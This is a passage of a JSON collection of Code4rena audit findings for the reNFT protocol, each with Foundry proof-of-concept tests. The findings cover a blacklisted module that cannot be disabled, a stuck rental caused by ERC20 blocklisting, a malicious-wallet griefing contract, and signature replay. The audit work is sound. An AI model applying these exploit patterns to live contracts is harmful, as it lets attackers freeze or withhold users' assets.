      "content": "\nSafe owners can enable modules on their safes only if those modules are whitelisted, this check is also done on disabling modules, which poses a problem. This guarding logic is handled in `_checkTransaction` in `Guard.sol`. If a module is whitelisted and a safe owner enables it on his safe, later protocol admins find out that the module has a serious bug and should be blacklisted so no more rental safes are affected, at this point the safe owner has no way of disabling that module as it is blacklisted, and his safe will be vulnerable to exploitation forever, putting all the safe's possessions at risk.\n\n### Proof of Concept\n\n<Details>\n\n```solidity\nfunction test_bug_CantDisableBlacklistedExtension() public {\n    address EXTENSION_1 = TEST_ADDR_1;\n    address EXTENSION_2 = TEST_ADDR_2;\n    address bobSafe = address(bob.safe);\n\n    // Extensions 1 and 2 are whitelisted\n    vm.startPrank(deployer.addr);\n    admin.toggleWhitelistExtension(EXTENSION_1, true);\n    admin.toggleWhitelistExtension(EXTENSION_2, true);\n    vm.stopPrank();\n\n    assertTrue(STORE.whitelistedExtensions(EXTENSION_1));\n    assertTrue(STORE.whitelistedExtensions(EXTENSION_2));\n\n    // Bob enables the extensions on his safe\n    vm.startPrank(bob.addr);\n    bytes memory transactionSignature = SafeUtils.signTransaction(\n        bobSafe,\n        bob.privateKey,\n        bobSafe,\n        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_1)\n    );\n    SafeUtils.executeTransaction(\n        bobSafe,\n        bobSafe,\n        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_1),\n        transactionSignature\n    );\n    transactionSignature = SafeUtils.signTransaction(\n        bobSafe,\n        bob.privateKey,\n        bobSafe,\n        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_2)\n    );\n    SafeUtils.executeTransaction(\n        bobSafe,\n        bobSafe,\n        abi.encodeWithSelector(ISafe.enableModule.selector, EXTENSION_2),\n        transactionSignature\n    );\n    vm.stopPrank();\n\n    assertTrue(ISafe(bobSafe).isModuleEnabled(EXTENSION_1));\n    assertTrue(ISafe(bobSafe).isModuleEnabled(EXTENSION_2));\n\n    // Extensions 1 and 2 are blacklisted\n    vm.startPrank(deployer.addr);\n    admin.toggleWhitelistExtension(EXTENSION_1, false);\n    admin.toggleWhitelistExtension(EXTENSION_2, false);\n    vm.stopPrank();\n\n    assertFalse(STORE.whitelistedExtensions(EXTENSION_1));\n    assertFalse(STORE.whitelistedExtensions(EXTENSION_2));\n\n    // Bob tries to disable extension 1 on his safe, reverts as it is blacklisted\n    vm.startPrank(bob.addr);\n    transactionSignature = SafeUtils.signTransaction(\n        bobSafe,\n        bob.privateKey,\n        bobSafe,\n        abi.encodeWithSelector(ISafe.disableModule.selector, EXTENSION_2, EXTENSION_1)\n    );\n    vm.expectRevert();\n    SafeUtils.executeTransaction(\n        bobSafe,\n        bobSafe,\n        abi.encodeWithSelector(\n            ISafe.disableModule.selector,\n            EXTENSION_2,\n            EXTENSION_1\n        ),\n        transactionSignature\n    );\n    vm.stopPrank();\n}\n```\n</details>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nAllow users to disable any module without looking if it's whitelisted or not but with having a list of modules that can't be disabled that should contain the stop policy.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/43#issuecomment-1908291416)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/15) - Introduces more granular controls over whitelist for extensions.\n\n**Status:** Unmitigated. Full details in report from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue where safe owners are unable to disable modules on their safes if those modules have been blacklisted. This poses a problem because if a module is found to have a serious bug and is blacklisted by protocol admins, the safe owner will not be able to disable it, leaving their safe vulnerable to exploitation. The report provides a proof of concept and recommends allowing users to disable any module without checking if it is whitelisted, but with a list of modules that cannot be disabled. The bug has been confirmed and the project has taken steps to mitigate it, but it is still considered unmitigated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/43",
      "tags": [],
      "finders": [
        "oakcobalt",
        "ZdravkoHr",
        "fnanni",
        "0xAlix2",
        "J4X",
        "0xA5DF",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "30542",
      "title": "[M-15]  Blocklisting in payment ERC20 can cause rented NFT to be stuck in Safe",
      "impact": "MEDIUM",
      "content": "\nWhen a rental is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265) transfers the rented NFT back from the renter's Safe to the lender's wallet and transfers the ERC20 payments from the payment escrow contract to the respective recipients (depending on the type of rental, those can be the renter, the lender, or both).\n\nTo transfer the ERC20 payments, [`PaymentEscrow.settlePayment()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L320) is called.\n\n`PaymentEscrow.settlePayment()` will use [`_safeTransfer()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L100) (via `_settlePayment()` and `_settlePaymentProRata()` or `_settlePaymentInFull()`) to transfer the ERC20 payments to the recipients:\n\n*   If the rental was a BASE order, the payment is sent to the lender.\n*   If the rental was a PAY order and the rental period is over, the payment is sent to the renter.\n*   If the rental was a PAY order and the rental period is not over, the payment is split between the lender and the renter.\n\nIf either the payment recipient or the payment escrow contract are blocklisted in the payment ERC20, the transfer will fail and `_safeTransfer()` will revert. In this case the rental is not stopped, the rented NFT will still be in the renter's Safe, and the payment will still be in the payment escrow contract.\n\nBlocklisting is implemented by several stablecoins issued by centralized entities (e.g. USDC and USDT) to be able to comply with regulatory requirements (freeze funds that are connected to illegal activities).\n\nThere are multiple scenarios that can have impact here:\n\nA. The renter of a PAY order rental is blocklisted: Even if the renter is already blocklisted before making the rental, the rental can still start, but ending the rental will not be possible, so the lender loses the rented NFT (it will be stuck in the Safe) and at least temporarily loses access to the payment (it will be stuck in the payment escrow, but a protocol admin could recover it).\n\nB. The lender of a BASE order rental is blocklisted: Ending the rental will not be possible, so the lender loses the rented NFT and the payment. However, it is unlikely that the lender has been blocklisted arbitrarily during the rental or wasn't aware of the blocklisting before the rental, so this scenario seems unlikely.\n\nC. The payment escrow contract becomes blocklisted during the rental (if it were blocklisted before the rental, the rental couldn't start): In this case the lender loses the rented NFT and the payment is lost. However, it seems unlikely that the payment escrow contract becomes blocklisted.\n\n### Impact\n\nOut of the scenarios listed above, scenario A has the highest impact. Anyone who is blocklisted by a ERC20 contract can grief any lender of a PAY order lending offer that offers this ERC20 as payment of their rental NFT. The attacker only has to pay the gas fee to start the rental to carry out this attack.\n\nScenarios B and C are less severe (due to low likelihood) but still relevant, as the blocklisting carried out in the external payment ERC20 contract causes the loss of the rental NFT.\n\n### Proof of Concept\n\nAdd blocklisting to the [MockERC20 contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/mocks/tokens/standard/MockERC20.sol):\n\n<details>\n\n```diff\ndiff --git a/test/mocks/tokens/standard/MockERC20.sol b/test/mocks/tokens/standard/MockERC20.sol\nindex 3e170c1..abcfaf7 100644\n--- a/test/mocks/tokens/standard/MockERC20.sol\n+++ b/test/mocks/tokens/standard/MockERC20.sol\n@@ -4,8 +4,26 @@ pragma solidity ^0.8.20;\n import {ERC20} from \"@openzeppelin-contracts/token/ERC20/ERC20.sol\";\n\n contract MockERC20 is ERC20 {\n+    mapping(address => bool) public isBlocklisted;\n+\n     constructor() ERC20(\"MockERC20\", \"MERC20\") {}\n\n+    function setBlock(address account, bool status) public {\n+        isBlocklisted[account] = status;\n+    }\n+\n+    function transfer(address to, uint256 value) public override returns (bool) {\n+        if (isBlocklisted[to] || isBlocklisted[msg.sender])\n+          revert(\"You are blocked\");\n+        return super.transfer(to, value);\n+    }\n+\n+    function transferFrom(address from, address to, uint256 value) public override returns (bool) {\n+        if (isBlocklisted[to] || isBlocklisted[from])\n+          revert(\"You are blocked\");\n+        return super.transferFrom(from, to, value);\n+    }\n+\n     function mint(address to, uint256 amount) public {\n         _mint(to, amount);\n     }\n```\n\n</details>\n\nAdd the following import to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):\n\n```solidity\nimport {Errors} from \"@src/libraries/Errors.sol\";\n```\n\nAdd the following test to `StopRent.t.sol`:\n\n<Details>\n\n```solidity\n    function test_StopRent_PayOrder_InFull_StoppedByLender_RenterBlocklisted() public {\n        // Blocklist the renter\n        erc20s[0].setBlock(bob.addr, true);\n\n        // create a PAY order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.PAY,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 1,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 0\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payOrder,\n            bytes32 payOrderHash,\n            OrderMetadata memory payOrderMetadata\n        ) = finalizeOrder();\n\n        // create a PAYEE order. The fulfiller will be the offerer.\n        createOrder({\n            offerer: bob,\n            orderType: OrderType.PAYEE,\n            erc721Offers: 0,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 1,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payeeOrder,\n            bytes32 payeeOrderHash,\n            OrderMetadata memory payeeOrderMetadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment for the pay order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payOrder,\n            orderHash: payOrderHash,\n            metadata: payOrderMetadata\n        });\n\n        // create an order fulfillment for the payee order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payeeOrder,\n            orderHash: payeeOrderHash,\n            metadata: payeeOrderMetadata\n        });\n\n        // add an amendment to include the seaport fulfillment structs\n        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n\n        // finalize the order pay/payee order fulfillment\n        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // try to stop the rental order (will revert)\n        vm.prank(alice.addr);\n        vm.expectRevert(\n          abi.encodeWithSelector(\n            Errors.PaymentEscrowModule_PaymentTransferFailed.selector,\n            address(erc20s[0]),\n            bob.addr,\n            100\n          )\n        );\n        stop.stopRent(payRentalOrder);\n\n        // get the rental order hashes\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n\n        // assert that the rental order still exists in storage\n        assertEq(STORE.orders(payRentalOrderHash), true);\n\n        // assert that the token are still rented out in storage\n        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n\n        // assert that the ERC721 is still in the safe\n        assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n\n        // assert that the offerer made a payment\n        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));\n\n        // assert that the fulfiller did not received the payment\n        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));\n\n        // assert that a payment is still in the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n    }\n```\n</details>\n\nNow the PoC can be run with:\n\n    forge test --match-path test/integration/StopRent.t.sol --match-test test_StopRent_PayOrder_InFull_StoppedByLender_RenterBlocklisted -vvv\n\n### Recommended Mitigation Steps\n\nI see two ways to mitigate this:\n\n*   Implement a non-reverting transfer helper function used for payments when stopping the rental. In case of blocklisting, the NFT would still be returned to the lender while the payment ERC20 stays in the payment escrow contract (but could be recovered by an admin unless the payment escrow contract itself is blocklisted).\n*   Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/64#issuecomment-1908303940)**\n\n**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/64#issuecomment-1913270795)**\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue with the transfer of ERC20 payments when a rental is stopped. This transfer is done through the `PaymentEscrow.settlePayment()` function, which uses `_safeTransfer()` to transfer the payments to the appropriate recipients. However, if either the payment recipient or the payment escrow contract is blocklisted in the payment ERC20, the transfer will fail and the rental will not be stopped. This can result in the rented NFT remaining in the renter's Safe and the payment remaining in the payment escrow contract. This issue can be exploited by someone who is blocklisted in the ERC20 contract, causing a loss of the rental NFT and temporary loss of access to the payment for the lender. The report suggests two potential mitigation steps to address this issue.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/64",
      "tags": [
        "Blacklisted",
        "ERC20",
        "Weird ERC20"
      ],
      "finders": [
        "holydevoti0n",
        "ladboy233",
        "0xHelium",
        "peanuts",
        "lanrebayode77",
        "ZanyBonzy",
        "rbserver",
        "marqymarq10",
        "0xabhay",
        "KupiaSec",
        "krikolkk",
        "albertwh1te",
        "DeFiHackLabs",
        "Qkite",
        "J4X",
        "said",
        "0xpiken",
        "HSP",
        "cccz",
        "EV\\_om",
        "serial-coder",
        "stackachu",
        "sin1st3r\\_\\_",
        "evmboi32",
        "oakcobalt",
        "Krace",
        "hash",
        "peter",
        "0xc695",
        "hals"
      ]
    },
    {
      "id": "30541",
      "title": "[M-14] Lender of a PAY order lending can grief renter of the payment",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43>\n\nIn a PAY order lending, the renter is payed by the lender to rent the NFT. When the rent is stopped, [`Stop.stopRent()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265), transfers the NFT from the renter's Safe back to the lender and transfers the payment to the renter.\n\nTo transfer the NFT from the Safe, [`_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166) is used, which makes the Safe contract execute a delegatecall to `Stop.reclaimRentalOrder()`, which is inherited from [`Reclaimer.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71). This function uses [`ERC721.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L33) or [`ERC1155.safeTransferFrom()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L43) to transfer the the NFT.\n\nIf the recipient of the NFT (the lender's wallet) is a smart contract, the `safeTransferFrom()` functions will call the `onERC721Received()` or `onERC1155BatchReceived()` callback on the lender's wallet. If those functions don't return the corresponding magic bytes4 value or revert, the transfer will revert. In this case stopping the rental will fail, the NFT will still be in the renter's wallet and the payment will stay in the payment escrow contract.\n\n### Impact\n\nA malicious lender can use this vulnerability to grief a PAY order renter of their payment by having the  `onERC721Received()` or `onERC1155BatchReceived()` callback function revert or not return the magic bytes4 value. They will need to give up the lent out NFT in return which will be stuck in the renter's Safe (and usable for the renter within the limitations of the rental Safe).\n\nHowever, the lender has the ability to release the NFT and payment anytime by making the callback function revert conditional on some parameter that they can set in their contract. This allows them to hold the renter's payment for ransom and making the release conditional on e.g. a payment from the renter to the lender. The lender has no risk here, as they can release their NFT at any time.\n\n### Proof of Concept\n\nAdd the following code to [`StopRent.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRent.t.sol):\n\n<details>\n\n```diff\ndiff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol\nindex 3d19d3c..551a1b6 100644\n--- a/test/integration/StopRent.t.sol\n+++ b/test/integration/StopRent.t.sol\n@@ -7,6 +7,49 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n\n import {BaseTest} from \"@test/BaseTest.sol\";\n\n+import {Errors} from \"@src/libraries/Errors.sol\";\n+import {IERC721} from \"@openzeppelin-contracts/token/ERC721/IERC721.sol\";\n+import {IERC20} from \"@openzeppelin-contracts/token/ERC20/IERC20.sol\";\n+\n+contract BadWallet {\n+  bool receiveEnabled = true;\n+  address owner = msg.sender;\n+\n+  // To enable EIP-1271.\n+  // Normally isValidSignature actually validates if the signature is valid and from the owner.\n+  // This is not relevant to the PoC, so we just validate anything here.\n+  function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {\n+    return this.isValidSignature.selector;\n+  }\n+\n+  function doApproveNFT(address target, address spender) external {\n+    require(msg.sender == owner);\n+    IERC721(target).setApprovalForAll(spender, true);\n+  }\n+\n+  function doApproveERC20(address target, address spender, uint256 amount) external {\n+    require(msg.sender == owner);\n+    IERC20(target).approve(spender, amount);\n+  }\n+\n+  function setReceiveEnabled(bool status) external {\n+    require(msg.sender == owner);\n+    receiveEnabled = status;\n+  }\n+\n+  function onERC721Received(\n+        address,\n+        address,\n+        uint256,\n+        bytes calldata\n+  ) external view returns (bytes4) {\n+    if (receiveEnabled)\n+      return this.onERC721Received.selector;\n+    else\n+      revert(\"Nope\");\n+  }\n+}\n+\n contract TestStopRent is BaseTest {\n     function test_StopRent_BaseOrder() public {\n         // create a BASE order\n```\n</details>\n\nAdd the following test to `StopRent.t.sol`:\n\n<details>\n\n```solidity\n    function test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed() public {\n        vm.startPrank(alice.addr);\n        BadWallet badWallet = new BadWallet();\n        erc20s[0].transfer(address(badWallet), 100);\n        badWallet.doApproveNFT(address(erc721s[0]), address(conduit));\n        badWallet.doApproveERC20(address(erc20s[0]), address(conduit), 100);\n        vm.stopPrank();\n        // Alice's key will be used for signing, but the newly create SC wallet will be used as her address\n        address aliceAddr = alice.addr;\n        alice.addr = address(badWallet);\n\n        // create a PAY order\n        // this will mint the NFT to alice.addr\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.PAY,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 1,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 0\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payOrder,\n            bytes32 payOrderHash,\n            OrderMetadata memory payOrderMetadata\n        ) = finalizeOrder();\n\n        // create a PAYEE order. The fulfiller will be the offerer.\n        createOrder({\n            offerer: bob,\n            orderType: OrderType.PAYEE,\n            erc721Offers: 0,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 1,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payeeOrder,\n            bytes32 payeeOrderHash,\n            OrderMetadata memory payeeOrderMetadata\n        ) = finalizeOrder();\n    \n        // Ensure that ERC721.safeTransferFrom to the wallet now reverts\n        vm.prank(aliceAddr);\n        badWallet.setReceiveEnabled(false);\n  \n        // create an order fulfillment for the pay order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payOrder,\n            orderHash: payOrderHash,\n            metadata: payOrderMetadata\n        });\n  \n        // create an order fulfillment for the payee order\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: payeeOrder,\n            orderHash: payeeOrderHash,\n            metadata: payeeOrderMetadata\n        });\n    \n        // add an amendment to include the seaport fulfillment structs\n        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n\n        // finalize the order pay/payee order fulfillment\n        (RentalOrder memory payRentalOrder, ) = finalizePayOrderFulfillment();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        // try to stop the rental order\n        vm.prank(bob.addr);\n        vm.expectRevert(Errors.StopPolicy_ReclaimFailed.selector);\n        stop.stopRent(payRentalOrder);\n\n        // get the rental order hashes\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n\n        // assert that the rental order still exists in storage\n        assertEq(STORE.orders(payRentalOrderHash), true);\n\n        // assert that the token is still rented out in storage\n        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n\n        // assert that the ERC721 is still in the Safe\n        assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n\n        // assert that the offerer made a payment\n        assertEq(erc20s[0].balanceOf(aliceAddr), uint256(9900));\n\n        // assert that the fulfiller did not received the payment\n        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10000));\n\n        // assert that a payment was not pulled from the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n    }\n```\n\n</details>\n\nNow the PoC can be run with:\n\n    forge test --match-path test/integration/StopRent.t.sol --match-test test_stopRent_payOrder_inFull_stoppedByRenter_paymentGriefed -vvv\n\n### Recommended Mitigation Steps\n\nI see three ways to mitigate this (however, the third one is incomplete):\n\n*   Split stopping the rental and transferring the assets into separate steps, so that after stopping the rental, the lender and the renter have to call separate functions to claim their assets.\n*   Change `Stop._reclaimRentedItems()` so that it doesn't revert when the transfer is unsuccessful.\n*   For ERC721 use `ERC721.transferFrom()` instead of `ERC721.safeTransferFrom()` to transfer the NFT back to the lender. I believe it is reasonable to assume that the wallet that was suitable to hold a ERC721 before the rental is still suitable to hold a ERC721 after the rental and the `onERC721Received` check is not necessary in this case. For ERC1155 this mitigation cannot be used because ERC1155 only has a `safeTransferFrom()` function that always does the receive check. So this mitigation is incomplete.\n\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1908313192)**\n\n**[JCN (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916120705):**\n > Hi @0xean ,\n> \n> It seems [Issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) also identifies the same root cause as this issue: A lender can implement a malicious callback to DOS the `stop` calls. \n> \n> However, this issue does not demonstrate a freezing of victim (renter) \"owned\" assets. In this issue the lender (attacker) is allowing their NFT and rental payment to be frozen in order to grief the victim. However, I would argue that the victim is not impacted in a way that warrants a `high` severity. Although the victim can not receive the proposed rental payment, they will essentially be able to utilize the rented NFT while the lender is \"griefing\" them. The renter is only losing \"theoretical capital\" in this situation (i.e. the rental payment, which was supplied by the attacker), but would be gaining access to the rented NFT for additional time.\n> \n> Meanwhile, [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) has identified how to leverage the root cause in this issue with another bug (`safe wallet can't differentiate between non-rented and rented ERC1155 tokens`) in order to permanently freeze a victim's ERC1155 tokens in their safe wallet. \n> \n> Given the information above, can you please provide the rationale behind labeling this issue (and duplicates) as `high` severity, while labeling [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and duplicates) as `medium` severity? Based on my observations it seems this issue (and duplicates) should be of `medium` severity. However, if its `high` severity status is maintained, then I would think that [issue #600](https://github.com/code-423n4/2024-01-renft-findings/issues/600) (and its duplicates) should be of `high` severity as well since these issues demonstrate a greater impact. \n> \n> I appreciate you taking the time to read my comment. \n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/65#issuecomment-1916974749):**\n > @0xJCN thanks for the comment. \n> \n> I have re-read the impact and better understand this issue as a result.  I do not agree that this loss is \"theoretical\", a withheld payment is not theoretical, however it is temporary if the lender has any intention to ever receive back their NFT and therefore since its temporary and not a complete loss I do think M is more appropriate.\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/65)._\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the Reclaimer smart contract used in the reNFT project. The vulnerability allows a malicious lender to grief a renter by withholding their payment for renting an NFT. This is possible because the contract uses a function called `_reclaimRentedItems()` to transfer the NFT back to the lender's wallet, but this function can be manipulated by the lender to withhold the NFT and the payment. This can be done by making the lender's wallet revert or not return the correct value in the `onERC721Received()` or `onERC1155BatchReceived()` callback functions. This means that the renter will not receive their payment and the NFT will remain in their wallet. The impact of this vulnerability is considered to be medium, as it is temporary and the lender can release the NFT and payment at any time. To mitigate this issue, it is recommended to split the process of stopping the rental and transferring the assets into separate steps, or to change the `_reclaimRentedItems()` function so that it does not revert when the transfer is unsuccessful. Alternatively, for ERC721 tokens, using `ERC721.transferFrom()` instead of `ERC721.safeTransferFrom()` can also mitigate this issue. However, this mitigation is not applicable for ERC1155 tokens. The severity of this issue has been decreased to medium after further discussion and understanding of the impact. ",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/65",
      "tags": [
        "Grief Attack"
      ],
      "finders": [
        "0xDING99YA",
        "juancito",
        "evmboi32",
        "jasonxiale",
        "cccz",
        "HSP",
        "1",
        "kaden",
        "2",
        "EV\\_om",
        "hash",
        "CipherSleuths",
        "0xc695",
        "0xA5DF",
        "hals",
        "stackachu",
        "lanrebayode77"
      ]
    },
    {
      "id": "30540",
      "title": "[M-13] `RentPayload`'s signature can be replayed",
      "impact": "MEDIUM",
      "content": "\nA malicious user could potentially fulfill all `PAY` orders that own the same value of `zonehash`.\n\n### Proof of Concept\n\nThe rental process in `reNFT` can simply be described as follows:\n\n1.  `lender` create either `BASE` or `PAY` order, which includes a `zoneHash`.\n2.  `renter` fulfills the rental order by providing certain items, including `fulfiller`, `payload`(a structured data of `RentPayload`), and its corresponding signature.\n3.  Once the rental order is created, `Create#validateOrder()` will be executed to verify if the rental order is valid:\n    *   decode `payload` and its `signature` from `zoneParams.extraData`\n    *   Check if the signature is expired by comparing `payload.expiration` and `block.timestamp`\n    *   Recover the signer from `payload` and its `signature` and check if the signer is protocol signer\n    *   check if `zonehash` is equal to the derived hash of `payload.metadata`\n\nLet's take a look at `RentPayload` and its referenced structures:\n\n```solidity\nstruct RentPayload {\n    OrderFulfillment fulfillment;\n    OrderMetadata metadata;\n    uint256 expiration;\n    address intendedFulfiller;\n}\nstruct OrderFulfillment {\n    // Rental wallet address.\n    address recipient;\n}\nstruct OrderMetadata {\n    // Type of order being created.\n    OrderType orderType;\n    // Duration of the rental in seconds.\n    uint256 rentDuration;\n    // Hooks that will act as middleware for the items in the order.\n    Hook[] hooks;\n    // Any extra data to be emitted upon order fulfillment.\n    bytes emittedExtraData;\n}\n```\n\nBy observing all items in `Rentpayload`, it's obvious that there is no way to verify whether the signature of a `payload` has been used or not. The signature verification can always be passed as long as it has not expired.\n\nIf multiple `PAY` rental orders own the same `metadata`, a user could potentially utilize their `payload` and unexpired `signature` to fulfill all these rental orders and acquire rental earnings. Since `OrderMetadata` structure is very simple, the chance that two different orders own same `metadata` could be high.\n\nUpdate testcase `test_stopRentBatch_payOrders_allDifferentLenders()`in [`StopRentBatch.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRentBatch.t.sol) with below codes and run `forge test --match-test test_stopRentBatch_payOrders_allDifferentLenders`:\n\n<details>\n\n```diff\n    function test_stopRentBatch_payOrders_allDifferentLenders() public {\n        // create an array of offerers\n        ProtocolAccount[] memory offerers = new ProtocolAccount[](3);\n        offerers[0] = alice;\n        offerers[1] = bob;\n        offerers[2] = carol;\n\n        // for each offerer, create an order and a fulfillment\n        for (uint256 i = 0; i < offerers.length; i++) {\n            // create a PAY order\n            createOrder({\n                offerer: offerers[i],\n                orderType: OrderType.PAY,\n                erc721Offers: 1,\n                erc1155Offers: 0,\n                erc20Offers: 1,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 0\n            });\n\n            // finalize the pay order creation\n            (\n                Order memory payOrder,\n                bytes32 payOrderHash,\n                OrderMetadata memory payOrderMetadata\n            ) = finalizeOrder();\n\n            // create a PAYEE order. The fulfiller will be the offerer.\n            createOrder({\n                offerer: dan,\n                orderType: OrderType.PAYEE,\n                erc721Offers: 0,\n                erc1155Offers: 0,\n                erc20Offers: 0,\n                erc721Considerations: 1,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // finalize the pay order creation\n            (\n                Order memory payeeOrder,\n                bytes32 payeeOrderHash,\n                OrderMetadata memory payeeOrderMetadata\n            ) = finalizeOrder();\n\n            // create an order fulfillment for the pay order\n            createOrderFulfillment({\n                _fulfiller: dan,\n                order: payOrder,\n                orderHash: payOrderHash,\n                metadata: payOrderMetadata\n            });\n\n            // create an order fulfillment for the payee order\n            createOrderFulfillment({\n                _fulfiller: dan,\n                order: payeeOrder,\n                orderHash: payeeOrderHash,\n                metadata: payeeOrderMetadata\n            });\n+           console.logBytes(ordersToFulfill[i*2].advancedOrder.extraData);\n\n            // add an amendment to include the seaport fulfillment structs\n            withLinkedPayAndPayeeOrders({\n                payOrderIndex: (i * 2),\n                payeeOrderIndex: (i * 2) + 1\n            });\n        }\n\n        // finalize the order pay/payee order fulfillments\n        RentalOrder[] memory 